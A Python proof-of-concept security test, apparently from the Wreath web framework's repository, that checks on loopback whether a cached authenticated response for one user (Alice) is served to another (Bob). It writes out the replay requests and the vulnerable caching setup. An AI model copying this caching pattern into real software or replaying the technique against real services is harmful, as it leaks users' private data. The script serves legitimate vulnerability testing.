"""PoC: replay one authenticated caller's cached response to another.

Run from the repository root::

    uv run python tests/security/poc_authenticated_query_cache_leak.py

The script binds only to loopback and drives Wreath through the metal event
loop and native HTTP/1 server.  The route uses the documented ``query_params``
cache-key helper to bound its public query keyspace.  A vulnerable build stores
Alice's authenticated response under that shared key and serves it to Bob.
"""

from __future__ import annotations

import asyncio
import socket
import threading

from wreath import Wreath
from wreath.auth import BearerTokenBackend, Identity, authenticated
from wreath.reactor import metal_event_loop
from wreath.response_cache import cached
from wreath.server import Server, ServerConfig


def _exchange(
    port: int,
    token: str,
    output: list[bytes],
    loop: asyncio.AbstractEventLoop,
    finished: asyncio.Event,
) -> None:
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=5) as client:
            client.sendall(
                b"GET /me?view=profile HTTP/1.1\r\n"
                b"Host: 127.0.0.1\r\n"
                + f"Authorization: Bearer {token}\r\n".encode()
                + b"Connection: close\r\n\r\n"
            )
            response = bytearray()
            while part := client.recv(4096):
                response += part
            output.append(bytes(response))
    finally:
        loop.call_soon_threadsafe(finished.set)


async def _drive(server: Server, port: int) -> list[bytes]:
    responses: list[bytes] = []
    loop = asyncio.get_running_loop()
    for token in ("alice", "bob"):
        finished = asyncio.Event()
        thread = threading.Thread(
            target=_exchange,
            args=(port, token, responses, loop, finished),
        )
        thread.start()
        await finished.wait()
        thread.join()
    await server.close()
    return responses


def main() -> int:
    app = Wreath()
    app.configure_auth(
        BearerTokenBackend(
            lambda token: Identity(id=token) if token in {"alice", "bob"} else None
        )
    )

    @app.get("/me")
    @authenticated()
    @cached(ttl=60, query_params=("view",))
    async def me(request) -> str:
        return request.identity.id

    loop = metal_event_loop(gc_mode="stock")
    try:
        config = ServerConfig(
            host="127.0.0.1",
            port=0,
            protocols=("http/1.1",),
            lifespan="off",
        )
        server = Server(app, config, loop)
        loop.run_until_complete(server._start(ssl=None, tls=None))
        port = server.sockets[0].getsockname()[1]
        responses = loop.run_until_complete(_drive(server, port))
    finally:
        loop.close()

    bodies = [response.partition(b"\r\n\r\n")[2] for response in responses]
    for body in bodies:
        print(body.decode("utf-8", "replace"))
    vulnerable = bodies == [b"alice", b"alice"]
    print("VULNERABLE: Bob received Alice's cached body" if vulnerable else "not vulnerable")
    return 0 if vulnerable else 1


if __name__ == "__main__":
    raise SystemExit(main())
